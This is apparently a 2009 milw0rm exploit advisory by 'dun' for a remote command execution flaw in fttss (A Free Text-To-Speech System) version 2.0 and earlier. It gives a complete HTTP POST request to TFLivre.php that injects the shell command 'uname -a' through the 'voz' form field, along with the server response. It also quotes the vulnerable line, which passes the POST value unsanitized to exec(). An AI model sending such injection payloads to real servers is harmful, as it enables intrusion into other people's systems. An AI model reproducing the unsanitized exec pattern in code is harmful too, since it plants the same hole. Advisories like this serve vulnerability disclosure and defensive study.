@@ -1,0 +1,61 @@
+
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+   
+ ##############################################################
+ #  [ fttss <= 2.0 ]  Remote Command Execution Vulnerability  #
+ ##############################################################
+ #
+ # Script: "A Free Text-To-Speech System"
+ #
+ # Script site: http://fttss.sourceforge.net/
+ # Download: http://sourceforge.net/projects/fttss/
+ #
+ # [RCE] Vuln: http://site.com/fttss/TFLivre.php
+ #	
+ # 	POST /fttss/TFLivre.php HTTP/1.1
+ #	
+ #	Host: site.com
+ #	User-Agent: Mozilla/5.0
+ #	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ #	Accept-Language: pl,en-us;q=0.7,en;q=0.3
+ #	Accept-Encoding: gzip,deflate
+ #	Accept-Charset: ISO-8859-2,utf-8;q=0.7,*;q=0.7
+ #	Keep-Alive: 300
+ #	Connection: keep-alive
+ #	Content-Type: application/x-www-form-urlencoded
+ #	Content-Length: 41
+ #	
+ #	texto_original=a&voz=|uname -a>/tmp/dupa;
+ #	
+ # HTTP/1.x 200 OK
+ # Date: Sun, 11 Jan 2009 16:24:57 GMT
+ # Server: Apache
+ # X-Powered-By: PHP/5.2.8-pl1-gentoo
+ # Content-Length: 1731
+ # Keep-Alive: timeout=15, max=100
+ # Connection: Keep-Alive
+ # Content-Type: text/html
+ #     
+ # Bug: ./fttss_v2.0/TFLivre.php (line: 110)
+ #
+ # ...
+ #		exec("./mbrola-linux-i386 -e ".$_POST[voz]." $dirsaida/saida.txt ".$nome_som.".wav"); //$dirsaida/saida".$npid.".wav");
+ # ... 	 
+ #
+ #
+ ###############################################
+ # Greetz: D3m0n_DE * str0ke * and otherz..
+ ###############################################
+
+ [ dun / 2009 ] 
+
+*******************************************************************************************
+
+# milw0rm.com [2009-01-11]
